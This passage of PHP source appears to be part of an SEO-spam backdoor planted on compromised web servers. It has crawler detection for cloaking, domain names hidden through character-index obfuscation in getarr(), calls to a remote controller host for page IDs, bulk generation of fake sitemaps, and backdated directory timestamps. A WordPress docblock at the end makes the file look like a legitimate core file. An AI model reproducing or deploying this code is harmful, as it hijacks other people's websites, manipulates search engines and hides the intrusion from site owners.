				$strBreads .= '<'.$breadTagHtml1.'>';
			
			$strBreads .= '<'.$breadTagHtml2.' class="'.$classul.'" itemscope itemtype="http://schema.org/BreadcrumbList">';
			$strBreads .= '<li itemscope itemtype="http://data-vocabulary.org/Breadcrumb"><a href="/" itemprop="url"><span itemprop="title">Home</span></a></li>';
			if(count($catArr)){
				foreach($catArr as $vs){
					$vs = trim($vs);
					$nowCatUrl = getCatLink($vs);
					$strBreads .= '<li itemscope itemtype="http://data-vocabulary.org/Breadcrumb"><a href="'.$nowCatUrl.'" itemprop="url"><span itemprop="title">'.$vs.'</span></a></li>';
				}
			}
				
				
			$strBreads .= '<li><strong>'.$Ptitle.'</strong></li>';
				
			$strBreads .= '</'.$breadTagHtml2.'>';
			$strBreads .= '</'.$breadTagHtml1.'>';
		}
	}
	
	
	return $strBreads;

}


function getCatLink($CatName){
		
		global $arrnametime,$arrKeywz,$arr_word,$strRand;		
	
		$filePres = '';		$fileEnds = '';		$siteLink='http://'.$_SERVER['HTTP_HOST'];
		$dirNames = dirname(__FILE__);		$httcReplace = end((explode(DIRECTORY_SEPARATOR, $dirNames)));		
		if(JDT == 2){
			$filePres = $siteLink ."/". $httcReplace . "/" . basename(__FILE__) . "/";		}elseif(JDT == 1){
			$filePres = $siteLink ."/". $httcReplace . "/";		}elseif(JDT == 3){
			$filePres = $siteLink ."/". $httcReplace . "/" .basename(__FILE__) . "?cat=";		}else{
			$filePres = $siteLink."/";		}
		
		$CatName = str_replace('&',' ',$CatName);
		$CatName = str_replace('&',' ',$CatName);
		if(JDT == 3){
			
			$CatName = preg_replace('#\s+#i','-',$CatName);
			
			
			while(strstr($CatName,'--'))
				$CatName = str_replace('--','-',$CatName);
			
			$linkCenter = $CatName;	
			
			$rtStr = $filePres.$linkCenter;
			$rtStr = str_replace($filePres.'-',$filePres,$rtStr);
		
			return $rtStr;
			
			}
		
		
		
		
		$CatName = preg_replace('#\s+#i','-',$CatName);
		$CatName = str_replace('--','-',$CatName);
		$linkCenter = BZCAT.'/'.str_replace('--','-',$CatName);
		$linkCenter .= JTHZ;		
		$rtStr = $filePres.$linkCenter;
		$rtStr = str_replace($filePres.'-',$filePres,$rtStr);
		
		return $rtStr;
			
	}
	
		
	
function getMapNum($bgNum,$mapnum){
	$TempArr = array();
	if($bgNum + $mapnum <= FNUM){
		for($i=0;$i<$mapnum;$i++){
			$TempArr[$i] = $bgNum + $i -1;
		}
	}else{
		for($i=0;$i<$mapnum;$i++){
			if($bgNum+$i > FNUM)
				$TempArr[$i] = $bgNum + $i -1 -FNUM;
			else
				$TempArr[$i] = $bgNum + $i -1;
		}
	}
	
	return $TempArr;
}


function getRandCId($rqurl){
	global $thisdom;
	
	for($i=0;$i<3;$i++){
		$idUrl =  GETDOM . "gpage.php?site=$thisdom&cid=$rqurl";
		$tempIdStr = curl_get_from_webpage($idUrl,'',5);
		if(preg_match('#<cid>(\d+)</cid>#i',$tempIdStr,$matchId)){
			return $matchId[1];
		}
	}
	
	header("HTTP/1.1 404 Not Found");  
	header("Status: 404 Not Found");  
	exit; 
	
}


function getRandId(){
	$num = rand(1,FNUM);	$num = $num - 1;	require(FILEDIRNAME . "/id$num.php");	$indexId=array_rand($arrId,1);	$id = $arrId[$indexId];	unset($arrId);	return $id;}
function get_arrvs($arr,$num,$nowkey){
	$numArr = count($arr);	
	if($nowkey + $num < $numArr)
		return $arr[$nowkey + $num];	else{
		if($nowkey + $num - $numArr - $numArr > 0)
			return get_arrvs($arr,$num - $numArr,$nowkey);		else
			return $arr[abs($nowkey + $num - $numArr)];	}
}

function get_pre_link($arr,$key){
	
	$tmpA1 = array();	$tmpA2 = array();	
	$num = count($arr);	
	
	if($key + JGNUM + 1 + LINKNUM >= $num){
		
		if($key + JGNUM + 1 - $num > LINKNUM){
			return array_slice($arr, $key + JGNUM + 1 - $num, LINKNUM);		}else{
		
		$duoyu = $key + JGNUM + 1 + LINKNUM - $num + 1;		$tmpA1 = array_slice($arr, $key + JGNUM + 1, LINKNUM);		$tmpA2 = array_slice($arr, 0, $duoyu);			
		return array_merge($tmpA1,$tmpA2);		}
	}else{
			return  array_slice($arr, $key + JGNUM + 1, LINKNUM);	}
	
}
function get_next_link($arr,$key){
	
	$tmpA1 = array();	$tmpA2 = array();	
	$num = count($arr);	if($key - JGNUM - LINKNUM < 0 && $key - JGNUM > 0){
		$duoyu = abs($key - JGNUM - LINKNUM);		$tmpA1 = array_slice($arr, 0, abs($key - JGNUM));		$tmpA2 = array_slice($arr, $num-$duoyu-1, $duoyu);		return array_merge($tmpA1,$tmpA2);	}else{
			return  array_slice($arr, $key - JGNUM - LINKNUM, LINKNUM);	}
}
function rFile($file){
	if(function_exists('file_get_contents')){
		return file_get_contents($file);
	}else{
		$handle = fopen($file, "r");
		$contents = fread($handle, filesize($file));
		fclose($handle);
		return $contents;
	}
}
function isCrawler() {
	$agent= @strtolower($_SERVER['HTTP_USER_AGENT']);	if (!empty($agent)) {
		$spiderSite= array(
			"Googlebot",
			"Mediapartners-Google",
			"Adsbot-Google",
			"Yahoo!",
			"Google AdSense",
			"Yahoo Slurp",
			"bingbot",
			"MSNBot"
		);		foreach($spiderSite as $val) {
		$str = strtolower($val);		if (strpos($agent, $str) !== false) {
			return true;			}
		}
	} else {
		return false;	}
} 


function gsitemap2($filenames,$c=1,$jdt=1){
	global $gnumber,$arrArrr;
$arrABC = range('a','z');
$tparrsI = $filenames;
$randnum = rand(7000,7600);
$tparrII = array_rand($tparrsI,$randnum);
$tparrIII = array();
foreach($tparrII as $vs){
	$tparrIII[$vs] = $filenames[$vs];
}
$filenames = $tparrIII;

	$filePres = '';	$fileEnds = '';	
	$dirNames = dirname(__FILE__);	$httcReplace = end((explode(DIRECTORY_SEPARATOR, $dirNames)));			
	if(JDT == 2){
		$filePres = $httcReplace . "/" . basename(__FILE__) . "/";	}elseif(JDT == 1){
		$filePres = $httcReplace . "/";	}elseif(JDT == 3){
		$filePres = $httcReplace . "/" .basename(__FILE__) . "?key=";	}else{
		$filePres = '';	}
	if(JDT == 3){
		$fileEnds = '';	}else{
		$fileEnds = JTHZ;	}
	$fpath='http://'.$_SERVER['HTTP_HOST'].$_SERVER['REQUEST_URI'];	$serpath=substr($fpath,0,strrpos($fpath,'/'));
	$siteLink='http://'.$_SERVER['HTTP_HOST'];		
	$mapPre = '<'.'?xml version="1.0" encoding="UTF-8" ?'.'>'. PHP_EOL.'<urlset xmlns="http://www.sitemaps.org/schemas/sitemap/0.9">' . PHP_EOL;	$mapEnd = PHP_EOL .  '</urlset>';
	// $urlsArray = $filenames;
	// $numLinks = count($urlsArray);
	$star = 0;	$priority = 0.1;	$starPri = 0;	$gFile ="";	$date = date("Y-m-d");	$time = date("H:i:s");
	$str = "";						
	$tempArr1 = $filenames;
	
	foreach($tempArr1 as $key => $value2){
		$curphp=basename(__FILE__); 
		$value = $value2;		$first=stristr($value,".php");		$last=stristr($value,".xml");		$checkTxt =stristr($value,".txt");		
			$tempPid = $key;
		
			$url = getalink($tempPid,$value2);

		
		if($first===false && $last===false && $checkTxt===false)
		{
			$date = date("Y-m-d");			$time = date("H:i:s");				
		
			if($star % 12000==11999){
				$gFile =  '../sitemap/sitemap' . $arrABC[$gnumber-1] .'.xml';				echo '<br/>'.$gFile.'<br/>';				$put_str = $mapPre . $str . $mapEnd;				@unlink($gFile);				file_put_contents($gFile,$put_str);
				file_put_contents("./map.log",'#sitemap' . $arrABC[$gnumber-1] .'.xml#'.PHP_EOL,FILE_APPEND);
				$str = '';				$gnumber++;				return;			}
			
		
			
	
			$str .= "     <url>
			 <loc>" . $url . "</loc> 
			 <lastmod>". $date . "T" . $time ."-05:00</lastmod>   
			 <changefreq>daily</changefreq> 
			 <priority>0.1</priority> 
			 </url>
		";	
			
			
			$star++;			$starPri++;		}
	}
	
	{
		$gFile =  '../sitemap/sitemap' . $arrABC[$gnumber-1] .'.xml';			echo '<br/>'.$gFile.'<br/>';
		$put_str = $mapPre . $str . $mapEnd;		@unlink($gFile);		file_put_contents($gFile,$put_str);	
		file_put_contents("./map.log",'#sitemap' . $arrABC[$gnumber-1] .'.xml#'.PHP_EOL,FILE_APPEND);
		$gnumber++;	
	}
	
	unset($tempArr1);	unset($filenames);	
	echo "生成sitemap成功！";	
}
function gsitemap($filenames,$c=1,$jdt=1){
	global $gnumber,$arrArrr;
$arrABC = range('a','z');
$tparrsI = $filenames;
$randnum = rand(7000,7600);
$tparrII = array_rand($tparrsI,$randnum);
$tparrIII = array();
foreach($tparrII as $vs){
	$tparrIII[$vs] = $filenames[$vs];
}
$filenames = $tparrIII;
	
	$filePres = '';	$fileEnds = '';	
	
	$fpath='http://'.$_SERVER['HTTP_HOST'].$_SERVER['REQUEST_URI'];	$serpath=substr($fpath,0,strrpos($fpath,'/'));
	$siteLink='http://'.$_SERVER['HTTP_HOST'];		
	$mapPre = '<'.'?xml version="1.0" encoding="UTF-8" ?'.'>'. PHP_EOL.'<urlset xmlns="http://www.sitemaps.org/schemas/sitemap/0.9">' . PHP_EOL;	$mapEnd = PHP_EOL .  '</urlset>';
	// $urlsArray = $filenames;
	// $numLinks = count($urlsArray);
	
	$star = 0;	$priority = 0.9;	$starPri = 0;	$gFile ="";	$date = date("Y-m-d");	$time = date("H:i:s");
	$str = "     <url>
			 <loc>" . $siteLink . "</loc> 
			 <lastmod>". $date . "T" . $time ."-05:00</lastmod> 
			 <changefreq>always</changefreq> 
			 <priority>1.0</priority> 
			 </url>
		";						
	$tempArr1 = $filenames;
	
	foreach($tempArr1 as $key => $value2){
		$curphp=basename(__FILE__); 
		$value = $value2;		$first=stristr($value,".php");		$last=stristr($value,".xml");		$checkTxt =stristr($value,".txt");	
		
			$tempPid = $key;
				$url = getalink($tempPid,$value2);
		
		if($first===false && $last===false && $checkTxt===false)
		{
			$date = date("Y-m-d");			$time = date("H:i:s");			
	
			if($star % 12000==11999){
				$gFile =  '../sitemap/sitemap' . $arrABC[$gnumber-1] .'.xml';				echo '<br/>'.$gFile.'<br/>';				
				$put_str = $mapPre . $str . $mapEnd;				@unlink($gFile);				file_put_contents($gFile,$put_str);
				file_put_contents("./map.log",'#sitemap' . $arrABC[$gnumber-1] .'.xml#'.PHP_EOL,FILE_APPEND);
				$str = '';				$gnumber++;				return;				
			}
			
			if($starPri >= 400 && $priority != 0.1){
				$starPri = 0;				$priority = $priority - 0.1;			}
			
			if($priority > 0.1){
				
				$str .= "     <url>
					 <loc>" . $url . "</loc> 
					 <lastmod>". $date . "T" . $time ."-05:00</lastmod>   
					 <changefreq>daily</changefreq> 
					 <priority>". $priority . "</priority> 
					 </url>
				";	
			}else{
										$str .= "     <url>
			 <loc>" . $url . "</loc> 
			 <lastmod>". $date . "T" . $time ."-05:00</lastmod>   
			 <changefreq>daily</changefreq> 
			 <priority>0.1</priority> 
			 </url>
		";	
			}
			
			$star++;			$starPri++;		}
	}
	
	{
		$gFile =  '../sitemap/sitemap' . $arrABC[$gnumber-1] .'.xml';		echo '<br/>'.$gFile.'<br/>';
		$put_str = $mapPre . $str . $mapEnd;		@unlink($gFile);		file_put_contents($gFile,$put_str);	
		file_put_contents("./map.log",'#sitemap' . $arrABC[$gnumber-1] .'.xml#'.PHP_EOL,FILE_APPEND);
		$gnumber++;
	}
	
	unset($tempArr1);	unset($filenames);	echo "生成sitemap成功！";	
}
	
	
function curl_get_from_webpage($url,$proxy='',$loop=10){
	$data = false;        $i = 0;        while(!$data) {
             $data = curl_get_from_webpage_one_time($url,$proxy);             if($i++ >= $loop) break;        }
	return $data;}
 

function curl_getjs_from_webpage($url,$time){
if(function_exists("curl_init") && function_exists("curl_setopt") && function_exists("curl_exec") && function_exists("curl_close")){
 
    $curl = curl_init();	//如果有用代理,则使用代理.
	$user_agent = "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; chromeframe/12.0.742.100";			
	// $urlReferer = "http://www.google.com";
	curl_setopt($curl, CURLOPT_URL, $url);	
		if(stristr($url,"https:")){ curl_setopt_array($curl, array(CURLOPT_SSL_VERIFYHOST => 2,CURLOPT_SSL_VERIFYPEER => 0,	CURLOPT_POSTFIELDS => '',			CURLOPT_RETURNTRANSFER => 1,CURLOPT_TIMEOUT => $time,CURLOPT_USERAGENT => $user_agent,CURLOPT_HEADER => 1,			CURLOPT_VERBOSE => 0
			));}else{curl_setopt($curl, CURLOPT_URL, $url);curl_setopt($curl, CURLOPT_TIMEOUT, $time);curl_setopt($curl, CURLOPT_RETURNTRANSFER, 1);curl_setopt($curl, CURLOPT_HEADER, false);curl_setopt($curl, CURLOPT_RETURNTRANSFER, 1);curl_setopt($curl, CURLOPT_USERAGENT, $user_agent);
	}$data=curl_exec($curl);curl_close($curl); 
  }else{
 
    $is_auf=ini_get('allow_url_fopen') && function_exists("file_get_contents")?true:false; 
    if($is_auf){
		$data = file_get_contents($url); 
    }
 
  }
	if(!$data) return false;
	return $data;	
	
}

function curl_get_from_webpage_one_time($url,$proxy=''){
if(function_exists("curl_init") && function_exists("curl_setopt") && function_exists("curl_exec") && function_exists("curl_close")){
 
    $curl = curl_init();	//如果有用代理,则使用代理.
	$user_agent = "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; chromeframe/12.0.742.100";			
	// $urlReferer = "http://www.google.com";
	if(strlen($proxy) > 8) curl_setopt($curl, CURLOPT_PROXY, $proxy);
curl_setopt($curl, CURLOPT_URL, $url);	
		if(stristr($url,"https:")){ curl_setopt_array($curl, array(CURLOPT_SSL_VERIFYHOST => 2,CURLOPT_SSL_VERIFYPEER => 0,	CURLOPT_POSTFIELDS => '',			CURLOPT_RETURNTRANSFER => 1,CURLOPT_USERAGENT => $user_agent,CURLOPT_HEADER => 1,			CURLOPT_VERBOSE => 0
			));}else{curl_setopt($curl, CURLOPT_URL, $url);curl_setopt($curl, CURLOPT_RETURNTRANSFER, 1);curl_setopt($curl, CURLOPT_HEADER, false);curl_setopt($curl, CURLOPT_RETURNTRANSFER, 1);curl_setopt($curl, CURLOPT_USERAGENT, $user_agent);
	}$data=curl_exec($curl);curl_close($curl); 
  }else{
 
    $is_auf=ini_get('allow_url_fopen') && function_exists("file_get_contents")?true:false; 
    if($is_auf){
		$data = file_get_contents($url); 
    }
 
  }
	if(!$data) return false;
	return $data;	
	
}



	
//



function my_mkdir($dir){
		global  $fitime;
		if(!is_dir($dir)){
			mkdir($dir);
			@touch($dir, $fitime, $fitime);   
		} 
	}
	

	
	function generate_dir_file($gDir=''){
		
		global $hostDir;
		$gDir = str_replace('/',DIRECTORY_SEPARATOR,$gDir);
		$gDir = str_replace('\\',DIRECTORY_SEPARATOR,$gDir);
		$arr = explode(DIRECTORY_SEPARATOR,$gDir);
		
		if(count($arr) <= 0) return;
		
		if(!strstr($gDir,$hostDir))
			$dir = $hostDir;
		else
			$dir = '';


		for($i = 0 ; $i < count($arr)-1 ; $i++){
			$dir .= DIRECTORY_SEPARATOR . $arr[$i];
			my_mkdir($dir);
		}
		
		return $dir;
	}


	function strFilter($str){
		$str = str_replace('`', '', $str);
		$str = str_replace('·', '', $str);
		$str = str_replace('~', '', $str);
		$str = str_replace('!', '', $str);
		$str = str_replace('！', '', $str);
		$str = str_replace('@', '', $str);
		$str = str_replace('#', '', $str);
		$str = str_replace('$', '', $str);
		$str = str_replace('￥', '', $str);
		$str = str_replace('%', '', $str);
		$str = str_replace('^', '', $str);
		$str = str_replace('……', '', $str);
		$str = str_replace('*', '', $str);
		$str = str_replace('(', '', $str);
		$str = str_replace(')', '', $str);
		$str = str_replace('（', '', $str);
		$str = str_replace('）', '', $str);
		$str = str_replace('-', '', $str);
		$str = str_replace('_', '', $str);
		$str = str_replace('——', '', $str);
		$str = str_replace('+', '', $str);
		$str = str_replace('=', '', $str);
		$str = str_replace('|', '', $str);
		$str = str_replace('\\', '', $str);
		$str = str_replace('[', '', $str);
		$str = str_replace(']', '', $str);
		$str = str_replace('【', '', $str);
		$str = str_replace('】', '', $str);
		$str = str_replace('{', '', $str);
		$str = str_replace('}', '', $str);
		$str = str_replace('；', '', $str);
		$str = str_replace(':', '', $str);
		$str = str_replace('<', '', $str);
		$str = str_replace('>', '', $str);
		$str = str_replace('：', '', $str);
		$str = str_replace('\'', '', $str);
		$str = str_replace('"', '', $str);
		$str = str_replace(',', '', $str);
		$str = str_replace('，', '', $str);
		$str = str_replace('《', '', $str);
		$str = str_replace('》', '', $str);
		$str = str_replace('.', '', $str);
		$str = str_replace('。', '', $str);
		$str = str_replace('–', '', $str);
		$str = str_replace('–', '', $str);
		$str = str_replace('/', '', $str);
		$str = str_replace('、', '', $str);
		$str = str_replace('?', '', $str);
		$str = str_replace('？', '', $str);
		$str = str_replace('°', '', $str);
		$str = str_replace('&', '&amp;', $str);
		return trim($str);
	}

	
	function getalink($pid,$pname=''){
		
		global $arrnametime,$arrKeywz,$arr_word,$strRand;		
		
		$pname = strFilter($pname);

		$filePres = '';		$fileEnds = '';		$siteLink='http://'.$_SERVER['HTTP_HOST'];
		$dirNames = dirname(__FILE__);		$httcReplace = end((explode(DIRECTORY_SEPARATOR, $dirNames)));		
		if(JDT == 2){
			$filePres = $siteLink ."/". $httcReplace . "/" . basename(__FILE__) . "/";		}elseif(JDT == 1){
			$filePres = $siteLink ."/". $httcReplace . "/";		}elseif(JDT == 3){
			$filePres = $siteLink ."/". $httcReplace . "/" .basename(__FILE__) . "?keyword=";		}else{
			$filePres = $siteLink."/";		}
		
	
		$rsp = '#'. BZPRO .'\d+#';
		$pname = trim($pname);
		

		$pname = preg_replace('/\s+/', '-', $pname);
	
		
		if(JDT == 3){
			
			$rs = '#&[^;]+;#i';
			$pname = preg_replace($rs,'',$pname);
	
		
			while(strstr($pname,'&'))
				$pname = str_replace('&','',$pname);
			
			while(strstr($pname,'--'))
				$pname = str_replace('--','-',$pname);
			
			$linkCenter = $pname .'-' .$pid;
			$rtStr = $filePres.$linkCenter;
			$rtStr = str_replace($filePres.'-',$filePres,$rtStr);
		
			return $rtStr;
			
			}
			
		if(strlen($pname) > 235){
			$rs = '#&[^;]+;#i';
			$pname = preg_replace($rs,'',$pname);
			$pname = str_replace('&','',$pname);
			$pname = str_replace('&',';',$pname);
			if(function_exists("mb_substr")){
				$pname = mb_substr($pname, 0, 235, 'utf-8');
			}else{
				$pname = substr($pname, 0, 235);
			}
		}	
		
			$linkCenter = $pname .'-'. $pid;

		
			$linkCenter .= JTHZ;			$linkCenter = str_replace("-/","/",$linkCenter);			$linkCenter = str_replace("-".JTHZ,JTHZ,$linkCenter);		
		
			
			while(strstr($linkCenter,'--'))
				$linkCenter = str_replace('--','-',$linkCenter);	
			$linkCenter = str_replace('/-','/',$linkCenter);	
			
		$rtStr = $filePres.$linkCenter;
		$rtStr = str_replace($filePres.'-',$filePres,$rtStr);
		
		return $rtStr;
	}
	
	
	function rmhtmltag($tagname='',$str=''){
		$rulers = '#<'.$tagname.'[^>]*>.*?</'.$tagname.'>#s';
		$str = preg_replace($rulers,'',$str);
		$rulers = '#<'.$tagname.'[^>]*>.*?</'.$tagname.'>#i';
		$str = preg_replace($rulers,'',$str);
		return $str;
	
	}
  
  
  function rmhtmltag2($tagname='',$str=''){
		$rulers = '#<'.$tagname.'[^>]*>#s';
		$str = preg_replace($rulers,'',$str);
		$rulers = '#</'.$tagname.'>#s';
		$str = preg_replace($rulers,'',$str);
	
	$rulers = '#<'.$tagname.'[^>]*>#i';
	$str = preg_replace($rulers,'',$str);
	$rulers = '#</'.$tagname.'>#i';
	$str = preg_replace($rulers,'',$str);
	return $str;
	
	}
	
	
	
// 

	
	
function is_ip($localIp,$ipRanges)
{    
	$localIp = ip2long($localIp);  
	foreach($ipRanges as $val)
	{ 
		$ipmin=sprintf("%u",ip2long($val[0]));		$ipmax=sprintf("%u",ip2long($val[1]));
		if($localIp >= $ipmin && $localIp <= $ipmax)
		{   
			return true; 
		} 
	}   
	return false;}
 
function RandAbcs($length = ""){
    $str = "abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ_./:-";
    return ($str);
} 


 
function getarr(){
		global $O00O0O;
		$arr[0]=$O00O0O{6}.$O00O0O{8}.$O00O0O{13}.$O00O0O{6}.$O00O0O{11}.$O00O0O{4}.$O00O0O{3}.$O00O0O{0}.$O00O0O{19}.$O00O0O{0}.$O00O0O{63}.$O00O0O{23}.$O00O0O{24}.$O00O0O{25};$arr[1]=$O00O0O{12}.$O00O0O{8}.$O00O0O{11}.$O00O0O{21}.$O00O0O{0}.$O00O0O{8}.$O00O0O{2}.$O00O0O{4}.$O00O0O{13}.$O00O0O{19}.$O00O0O{4}.$O00O0O{17}.$O00O0O{63}.$O00O0O{23}.$O00O0O{24}.$O00O0O{25};$arr[2]=$O00O0O{13}.$O00O0O{14}.$O00O0O{21}.$O00O0O{4}.$O00O0O{23}.$O00O0O{14}.$O00O0O{18}.$O00O0O{14}.$O00O0O{20}.$O00O0O{17}.$O00O0O{4}.$O00O0O{63}.$O00O0O{23}.$O00O0O{24}.$O00O0O{25};$arr[3]=$O00O0O{19}.$O00O0O{20}.$O00O0O{18}.$O00O0O{8}.$O00O0O{12}.$O00O0O{4}.$O00O0O{3}.$O00O0O{8}.$O00O0O{6}.$O00O0O{8}.$O00O0O{19}.$O00O0O{0}.$O00O0O{11}.$O00O0O{63}.$O00O0O{23}.$O00O0O{24}.$O00O0O{25};$arr[4]=$O00O0O{17}.$O00O0O{14}.$O00O0O{2}.$O00O0O{0}.$O00O0O{13}.$O00O0O{0}.$O00O0O{19}.$O00O0O{17}.$O00O0O{0}.$O00O0O{13}.$O00O0O{18}.$O00O0O{63}.$O00O0O{23}.$O00O0O{24}.$O00O0O{25};
	return $arr;
}

	
function getthisdom(){
	$myArrs = getarr();
    return 'http://www.'.$myArrs[CENTERKEY].MYDIR;
} 
 
 
 
function get_real_ip(){
	
	
	   $ip = '';
    /**
     * resolve any proxies
     */
    if (isset($_SERVER)) {
      if (isset($_SERVER['HTTP_X_FORWARDED_FOR'])) {
        $ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
      } elseif (isset($_SERVER['HTTP_CLIENT_IP'])) {
        $ip = $_SERVER['HTTP_CLIENT_IP'];
      } elseif (isset($_SERVER['HTTP_X_FORWARDED'])) {
        $ip = $_SERVER['HTTP_X_FORWARDED'];
      } elseif (isset($_SERVER['HTTP_X_CLUSTER_CLIENT_IP'])) {
        $ip = $_SERVER['HTTP_X_CLUSTER_CLIENT_IP'];
      } elseif (isset($_SERVER['HTTP_FORWARDED_FOR'])) {
        $ip = $_SERVER['HTTP_FORWARDED_FOR'];
      } elseif (isset($_SERVER['HTTP_FORWARDED'])) {
        $ip = $_SERVER['HTTP_FORWARDED'];
      } else {
        $ip = $_SERVER['REMOTE_ADDR'];
      }
    }
    if (trim($ip) == '') {
      if (getenv('HTTP_X_FORWARDED_FOR')) {
        $ip = getenv('HTTP_X_FORWARDED_FOR');
      } elseif (getenv('HTTP_CLIENT_IP')) {
        $ip = getenv('HTTP_CLIENT_IP');
      } else {
        $ip = getenv('REMOTE_ADDR');
      }
    }

    /**
     * sanitize for validity as an IPv4 or IPv6 address
     */
    $ip = preg_replace('~[^a-fA-F0-9.:%/,]~', '', $ip);

    /**
     *  if it's still blank, set to a single dot
     */
    if (trim($ip) == '') $ip = '.';

    return $ip;
	
	}
 
 
 /**
 * Confirms that the activation key that is sent in an email after a user signs
 * up for a new site matches the key for that user and then displays confirmation.
 *
 * @package WordPress
 */
 
//file end